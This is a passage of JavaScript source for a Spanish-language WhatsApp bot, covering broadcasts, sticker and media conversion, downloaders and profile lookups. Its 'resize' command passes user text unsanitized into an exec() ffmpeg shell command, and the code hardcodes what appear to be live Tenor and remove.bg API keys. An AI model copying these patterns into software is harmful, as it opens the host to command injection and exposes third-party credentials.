for (let yoi of anu) {
await sleep(1500)
simple.sendMessage(yoi, {text:`${text}`}, {quoted:m})
}
reply('*Success Broadcast*')
}
break

            case 'bcgc': case 'bcgroup': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Que vas a difundir?\n\nEjemplo : ${prefix + command} Test`
                let getGroups = await simple.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                m.reply(` difusión enviada a ${anu.length} Chat/s grupal, hora de finalización ${anu.length * 1.5} segundos`)
                for (let i of anu) {
                    await sleep(1500)
                    let btn = [{
                                urlButton: {
                                    displayText: 'Instagram',
                                    url: 'https://instagram.com/c4rl0s_9e'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      simple.send5ButImg(i, txt, simple.user.name, global.thumb, btn)
                    }
                m.reply(`Envío exitoso de transmisión a ${anu.length} Grupo/s`)
            }
            break
            case 'bc': case 'broadcast': case 'bcall': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Que deseas transmitir?\n\nExample : ${prefix + command} fatih-san`
                let anu = await store.chats.all().map(v => v.id)
                m.reply(`Difusión enviada a ${anu.length} Chat/s\nTiempo de finalización ${anu.length * 1.5} segundos`)
		for (let yoi of anu) {
		    await sleep(1500)
		    let btn = [{
                                urlButton: {
                                    displayText: 'Instagram',
                                    url: 'https://instagram.com/c4rl0s_9e'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      simple.send5ButImg(yoi, txt, simple.user.name, global.thumb, btn)
		}
		m.reply('Enviada con exito')
            }
            break


//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 CONVERTIDORES - Bot_™ ❞|═══════════════════════════════════════════⬡|//	

            case 'sticker': case 's': case 'stickergif': case 'sgif': {
           if (/image/.test(mime)) {
           sticWait(from)
                let media = await simple.downloadMediaMessage(qmsg)
                let encmedia = await simple.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
            sticWait(from)
                if (qmsg.seconds > 11) return m.reply('Envia un video de maximo 10 segundos!')
                let media = await simple.downloadMediaMessage(qmsg)
                let encmedia = await simple.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                m.reply(`Enviar/responder imagen/video/gif con el comando ${prefix + command}\nLa duración de vídeos debe de ser máximo 9 segundos`)
                }
            }
            break

            case 'setexif': {
               if (!isCreator) throw mess.owner
               if (!text) throw `Ejemplo : ${prefix + command} packname|autor`
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          m.reply(`Exif se ha cambiado con éxito a\n\n⭔ Packname : ${global.packname}\n⭔ Autorr : ${global.author}`)
            }
            break
            case 'stickerwm': case 'swm': case 'stickergifwm': case 'sgifwm': {
                let [teks1, teks2] = text.split`|`
                if (!teks1) throw `Enviar/responder imagen/video con el comando ${prefix + command} text1|text2`
                if (!teks2) throw `Enviar/responder imagen/video con el comando ${prefix + command} text1|text2`
            	sticWait(from)
                if (/image/.test(mime)) {
                    let media = await simple.downloadMediaMessage(qmsg)
                    let encmedia = await simple.sendImageAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return m.reply('Maximo 10 segundos de video!')
                    let media = await simple.downloadMediaMessage(qmsg)
                    let encmedia = await simple.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else {
                    throw `Enviar imagen/video con el comando ${prefix + command}\nLa duración del video debe tener como máximo 9 segundos`
                }
            }
            break
            case 'ebinary': {
            if (!text) throw `Ejemplo : ${prefix + command} text`
            let { eBinary } = require('./lib/binary')
            let eb = await eBinary(text)
            m.reply(eb)
        }
        break
            case 'dbinary': {
            if (!text) throw `Ejemplo : ${prefix + command} text`
            let { dBinary } = require('./lib/binary')
            let db = await dBinary(text)
            m.reply(db)
        }
        break
            case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) throw `Usa este ejemplo : ${prefix + command} 😅+🤔`
		if (!emoji2) throw `Usa este ejemplo  : ${prefix + command} 😅+🤔`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await simple.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	    case 'emojimix2': {
	    if (!text) throw `Usa este ejemplo  : ${prefix + command} 😅`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		for (let res of anu.results) {
		    let encmedia = await simple.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	       case 'attp': case 'ttp': {
           if (!text) throw `Usa este ejemplo  : ${prefix + command} Hola`
           await simple.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'Simple', 'hola', m, {asSticker: true})

         }
         break
         	       case 'attp1': case 'attp2': case 'attp3': case 'attp4': case 'attp5': case 'attp6': {
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit                  
           if (!text) throw `Ejemplo : ${prefix + command} texto`
           await simple.sendMedia(m.chat, `https://api.brizaloka-api.tk/ttp/${command}?apikey=brizaloka&text=${text}`, 'by', 'carlo', st, {asSticker: true})

         }
         break
         	       case 'attpgrad': case 'attpgradient': {
                  
	       if (!isPremium && global.db.data.users[m.sender].limit < 1) return  (mess.endLimit) //ae
	       db.data.users[m.sender].limit -= 1 // -1 limit       
           if (!text) throw `Ejemplo : ${prefix + command} texto`
           await simple.sendMedia(m.chat, `https://api.violetics.pw/api/canvas/attp-gradient2?apikey=beta&text=${text}`, 'carlos', 'Op', st, {asSticker: true})

         }
         break
         
         case 'emoji':
if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //ae
db.data.users[m.sender].limit -= 1 // -1 limit 
if (args.length == 0) return reply(`Uso: ${prefix + command} 🗿`)
titor = await getBuffer(`https://api.zeeoneofc.xyz/api/emoji/apple?emoji=${encodeURI(q)}&apikey=V12`)
let encmedia = await simple.sendImageAsSticker(m.chat, titor, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
break
	       case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
	        let respond = `Enviar/responder imagen/sticker con el comando ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) throw respond
            if (!text) throw respond
	        sticWait(from)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
	        let dwnld = await simple.downloadMediaMessage(qmsg)
	        let { floNime } = require('./lib/uploader')
	        let fatGans = await floNime(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
	        let FaTiH = await simple.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
	        await fs.unlinkSync(FaTiH)
            }
	       break     
            case 'toimage': case 'toimg': {
                if (!/webp/.test(mime)) throw `Responde a un sticker con el comando *${prefix + command}*`
                sticWait(from)
                let media = await simple.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    simple.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
	        case 'tomp4': case 'tovideo': {
                if (!/webp/.test(mime)) throw `Responde a un sticker en movimiento con el comando *${prefix + command}*`
                sticWait(from)
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await simple.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await simple.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convertir webp a video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Enviar/responder video/audio que desea usar como audio con el comando ${prefix + command}`
            sticWait(from)
            let media = await simple.downloadMediaMessage(qmsg)
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            simple.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Enviar/responder video/audio que desea usar como audio con el comando ${prefix + command}`
            sticWait(from)
            let media = await simple.downloadMediaMessage(qmsg)
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            simple.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${simple.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Enviar/responder video/audio que desea usar como audio con el comando ${prefix + command}`
            sticWait(from)
            let media = await simple.downloadMediaMessage(qmsg)
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            simple.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) throw `Responde a un sticker en movimiento con el comando *${prefix + command}*`
                sticWait(from)
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await simple.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await simple.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convertir webp a video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
	        case 'tourl': {
                sticWait(from)
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await simple.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
            case 'imagenobg': case 'removebg': case 'remove-bg': {
	    if (!/image/.test(mime)) throw `Responde a una imagen con el comando ${prefix + command}`
	    if (/webp/.test(mime)) throw `Responde a una imagen con el comando ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await simple.downloadAndSaveMediaMessage(qmsg, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    sticWait(from)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    simple.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
  case 'backup':
  if (!isCreator) return reply(mess.owner)
  simple.sendMessage(sender, { document: fs.readFileSync('./src/database.json'), mimetype: 'json', caption: 'Una petición de : Owner', mentions: []}, { quoted: m })
  break
            case 'resize': {
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
    if (!m.mtype === "imageMessage") return replay("No es una imagen")
    if (!text) return replay(`Ejemplo: ${prefix + command} 300x300`)
    let p = text.split("x")[0]
    let l = text.split("x")[1]
    let media = await simple.downloadAndSaveMediaMessage(quoted, "image")
    let ran = getRandom('.jpg')
    exec(`ffmpeg -i ${media} -vf scale=${p}:${l} ${ran}`, async (err) => { 
      fs.unlinkSync(media)
      if (err) return setReply(err)
      let buffer = fs.readFileSync(ran)
      await simple.sendMessage(m.chat, {
        caption: `hola @${m.sender.split("@")[0]}`, 
        image: buffer,
        contextInfo: thumb
      },{ quoted: m })
      fs.unlinkSync(ran)
    })
  } 
    break
    case 'getgcjid': {
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
    if (!m.isGroup) return replay(mess.group)
    let metadata = await simple.groupMetadata(m.chat)
    let id = metadata.id
    let ppgc = await simple.profilePictureUrl(metadata.id, 'image')
    let buttons = [{
      index: 1,
      urlButton: {
        displayText: 'COPY JID',
        url: 'https://www.whatsapp.com/otp/copy/'+id 
      }
    }]
    simple.sendMessage(m.chat, {
      text: id,
      templateButtons: buttons,
      footer: simple.user.name
    }, { quoted: m })
  }
  break

        case 'chatid':
        m.reply(`${m.chat}`)
        break 	
        
//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 TEXTOS API - Bot_™ ❞|═══════════════════════════════════════════⬡|//	
    case "reto": {
        let dare = TD.get_dare();
        const x17 = await fetchJson(`https://api.popcat.xyz/translate?to=es&text=${dare}`)
        reply(x17.translated);
    }
    break
    case "verdad": {
        let truth = TD.get_truth();
        const txt = await fetchJson(`https://api.popcat.xyz/translate?to=es&text=${truth}`)
        reply(txt.translated);
    }
    break    
case 'casos':
const x16 = await fetchJson("https://nekos.life/api/v2/fact")
const x17 = await fetchJson(`https://api.popcat.xyz/translate?to=es&text=${x16.fact}`)
reply(x17.translated)
break
case 'consejo':
const x16 = await fetchJson("https://api.adviceslip.com/advice")
const x17 = await fetchJson(`https://api.popcat.xyz/translate?to=es&text=${x16.slip.advice}`)
reply(x17.translated)
break
//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 DESCARGAS - Bot_™ ❞|═══════════════════════════════════════════⬡|//	
    case "gatosad": {
        if (!text) {
            reply('Proporciona el texto!')
            return;
        }
        const response = await axios.get(`https://api.popcat.xyz/sadcat?text=${text}`, {
            responseType: 'arraybuffer'
        })
        const buffer = Buffer.from(response.data, "utf-8")
        try {
            await simple.sendMessage(from, {
                image: buffer,
                caption: "👀"
            }, {
                quoted: m
            });
        } catch (e) {
            await simple.sendMessage(from, {
                text: `pasa algo malo\n${e.message}`
            }, {
                quoted: m
            });
        }
    }
    break
case 'mediafire': {
if (!text) throw '*Ingresa el link de Mediafire!*'
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw '*Tu link no es válido*'
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 100) return reply('*archivo por encima del límite* '+util.format(baby1))
const result4 = `*DOWNLOAD MEDIAFIRE*

*Nombre* : ${baby1[0].nama}
*Tamaño* : ${baby1[0].size}
*Mímica* : ${baby1[0].mime}
*Link* : ${baby1[0].link}\n
_espera, Estoy procesando la descarga..._

*Simple Bot*`
reply(`${result4}`)
simple.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => reply('*Error de Descarga*'))
}
break
case 'animesearch': { 
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
sticWait(from)
await fetchJson(`https://api.jikan.moe/v4/anime?q=${q}`)
.then((res) =>{
console.log(res)   
let sections = []   
  for (let i of res.data) {
  const list = {title: `${i.title}`,
  rows: [
    {
     title: `${i.title}\n\n`, 
     rowId: `${prefix}animesearch2 ${i.mal_id}`,
     description: `${i.synopsis}`
    }, 
    ]
     }
     sections.push(list)   
     }
  const sendm =  simple.sendMessage(
      from, 
      {
       text: "Anime Search",
       footer: "By Carlos",
       title: "La base de datos está en este botón.",
       buttonText: "Haga clic y vea los resultados de la búsqueda➡️",
       sections
      }, { quoted : m }
    )  
})
}
  break
case 'animesearch2':{
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
await fetchJson(`https://api.jikan.moe/v4/anime/${q}`)
.then((res) => {
let txt = `     Anime Search      \n\n*Título:* *${res.data.title}*\n*inglés:* *${res.data.title_english}*\n*japonés:* *${res.data.title_japanese}*\n*Tipo de animé:* *${res.data.type}*\n*Adaptación:* *${res.data.source}*\n*Total episodios:* *${res.data.episodes}*\n*Estado:* *${res.data.status}*\n*En curso:* *${res.data.airing ? 'Sí' : 'No'}*\n*Emitido:* *${res.data.aired.string}*\n*Duración:* *${res.data.duration}*\n*Clasificación:* *${res.data.rating}*\n*Puntaje:* *${res.data.score}*\n*Rango:* *${res.data.rank}*\n*Productor Principal:* *${res.data.producers.name}*\n*Estudio:* *${res.data.studios[0].name}* `
simple.sendMessage(from, { image : { url : res.data.images.jpg.image_url}, caption : txt}, {quoted :m }) 
})
}
break
 case 'lirica': {
              if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return reply(`Comand usage: ${prefix}lyrics Opa `)
sticWait(from)	
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
reply(`
*Titulo :* ${result.title}
*Autor :* ${result.author}
*Url :* ${result.link}

*Lírica:* ${result.lyrics}

`.trim())
}
break           
                       case 'git': case 'gitclone':
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
	sticWait(from)
            let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
            if (!args[0]) reply(`Use ${prefix}gitclone +repositorio\nEjemplo: https://github.com/CarlosTwT/privateBot`)
    if (!regex1.test(args[0])) return reply("y el link?" )
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    simple.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
			break
case 'igstalk': case 'stalkig': {
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
if (!args.join(" ")) return reply(`Ejemplo : \n${prefix + command} CarlosTwT`)
sticWait(from)
stalker.igstalk(args[0])
igSt = await stalker.igstalk(args[0])
teks = `INSTAGRAM PERFIL
 • Username : ${args[0]}
 • Nombre : ${igSt.data.fullname}
 • Biografía : ${igSt.data.bio}
 • Bio Url : ${igSt.data.url}
 • Seguidores : ${igSt.data.follower} followers
 • Siguiendo : ${igSt.data.following} following
 • Privado : ${igSt.data.private ? "false" : "true"}
 • Verificado : ${igSt.data.verifed ? "false" : "true"}
 • Publicado : ${igSt.data.collections} postingan
 • VidPost : ${igSt.data.videotimline} video
 • FB Conectado : ${igSt.data.connected_fb}
https://www.instagram.com/${args[0]}`
simple.sendMessage(from, {image:{url:igSt.profile.high}, caption:teks}, {quoted:m})
}
break
            case 'gitstalk':
            case 'ghstalk':
            case 'githubstalk': {
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
                if (!text) throw `Usalo así ${prefix + command} *username*\n\nEjemplo : ${prefix + command} CarlosTwT`
                y = await fetchJson(`https://api.github.com/users/${text}`)
                let teks = `*Perfil Github*\n\n• Usuario : ${y.login}\n• Id : ${y.id}\n• Nodo Id : ${y.node_id}\n• Type : ${y.type}\n• Nombre : ${y.name}\n• Compañía : ${y.company}\n• Blog : ${y.blog}\n• Ubicación : ${y.location}\n• Email : ${y.email}\n• Bio : ${y.bio}\n• Repo(s) Publicos : ${y.public_repos}\n•  Gist(s) Gits : ${y.public_gists}\n• Seguidores : ${y.followers}\n• Siguiendo : ${y.following}\n• Creado el : ${moment(y.created_at).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n• Actualizado el : ${moment(y.updated_at).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}`
                let ghs = [

                    {

                        "urlButton": {

                            "displayText": `Perfil`,

                            "url": `https://github.com/${y.login}`

                        }

                    }

                ]

                buf = await getBuffer(y.avatar_url)

                simple.send5ButImg(m.chat, teks, `© ${simple.user.name}`, buf, ghs)
            }
            break
case 'tiktok': {
if (!args[0]) return m.reply(`_Ingresa un link de tiktok_\nEjemplo: ${prefix + command} https://vm.tiktok.com/ZMNHKVdPJ/?k= `)
const { author: { nickname }, video, description } = await tiktokdlv3(args[0])
const url = video.no_watermark || video.no_watermark2 || video.no_watermark_raw
if (!url) throw 'No puedo descargar videos!'
tistos = `*TIKTOK DOWNLOADER*\nUsuario: ${nickname}\nDescripcion: ${description}\n© © ঔৣ͜͡Ⓒ_乂 Simple WhatsApp - Bot_ 愛`
	simple.sendMessage(m.chat, {video: {url}, caption: tistos}, { quoted: m })
}
break	
	    case 'yts': case 'ytsearch': {
                if (!text) throw `Ejemplo: ${prefix + command} como le digo`
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Resultado de'+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `⭔ No : ${no++}\n⭔ Tipo : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Titulo : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duración : ${i.timestamp}\n⭔ Subido hace : ${i.ago}\n⭔ Autor : ${i.author.name}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
                }
                simple.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
        case 'google': {      
                if (!text) throw `Ejemplo : ${prefix + command} f`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += ` *Titulo* : ${g.title}\n`
                teks += ` *Descripcion* : ${g.snippet}\n`
                teks += ` *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                reply(teks)
                })
                }
                break
        case 'googleimg': {
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
        if (!text) throw `Ejemplo : ${prefix + command} cocacola`
        let gis = require('g-i-s')
        gis(text, async (error, result) => {
        n = result
        images = n[Math.floor(Math.random() * n.length)].url
        let buttons = [
                    {buttonId: `googleimg ${text}`, buttonText: {displayText: 'Next Imagen'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images },
                    caption: `*-------「 GOOGLE IMG SEARCH 」-------*
🤠 *Consulta* : ${text}
🔗 *Url* : ${images}`,
                    footer: simple.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                simple.sendMessage(m.chat, buttonMessage, { quoted: m })
        })
        }
        break
	    case 'play': case 'ytplay': {
                if (!text) throw `Ejemplo : ${prefix + command} Que descaro`
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [
                    {buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: '♫ Audio'}, type: 1},
                    {buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu.thumbnail },
                    caption: `
⭔ Título : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duración : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Hace : ${anu.ago}
⭔ Autor : ${anu.author.name}
⭔ Canal : ${anu.author.url}
⭔ Descripción : ${anu.description}
⭔ Url : ${anu.url}`,
                    footer: simple.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                simple.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	    case 'ytmp3': case 'ytaudio': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Ejemplo : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('Archivo por está encima del límite '+util.format(media))
                simple.sendImage(m.chat, media.thumb, `⭔ Título : ${media.title}\n⭔ Tamaño del archivo : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolución : ${args[1] || '128kbps'}`, m)
                simple.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'ytmp4': case 'ytvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Ejemplo a seguir : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 100000) return m.reply('Archivo por encima del límite '+util.format(media))
                simple.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Título : ${media.title}\n⭔ Tamaño : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolución : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
	    case 'getmusic': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Ejemplo : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Responde un resultado de ytsearch')
                if (!m.quoted.isBaileys) throw `Solo puede responder a los mensajes del bot`
		let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Tal vez el mensaje que respondiste no contiene el resultado de ytsearch`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('archivo por encima del límite '+util.format(media))
                simple.sendImage(m.chat, media.thumb, `⭔ Título : ${media.title}\n⭔ Tamaño : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolución : ${args[1] || '128kbps'}`, m)
                simple.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'getvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Responde un resultado de ytsearch')
                if (!m.quoted.isBaileys) throw `solo a mensajes míos`
                let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Tal vez el mensaje que respondiste no contiene el resultado de ytsearch`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                simple.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Título : ${media.title}\n⭔ Tamaño : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolución : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
case 'song': {
              if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
  sticWait(from)
  if (!text) throw `Ejemplo: ${prefix + command} Get Lucky`
  let yts = require("yt-search")
  let search = await yts(text)                   
let sections = []   
let listmenu = [`ytmp4 ${search.all[0].url}`,`ytmp3 ${search.all[1].url}`,`ytmp4 ${search.all[2].url}`,`ytmp3 ${search.all[3].url}`,`ytmp4 ${search.all[4].url}`,`ytmp3 ${search.all[5].url}`,`ytmp4 ${search.all[6].url}`,`ytmp3 ${search.all[7].url}`,`ytmp4 ${search.all[8].url}`,`ytmp3 ${search.all[9].url}`,`ytmp4 ${search.all[10].url}`,`ytmp3 ${search.all[11].url}`,`ytmp4 ${search.all[12].url}`,`ytmp3 ${search.all[13].url}`,`ytmp4 ${search.all[14].url}`,`ytmp3 ${search.all[15].url}`,`ytmp4 ${search.all[16].url}`,`ytmp3 ${search.all[17].url}`,`ytmp4 ${search.all[18].url}`,`ytmp3 ${search.all[19].url}`]
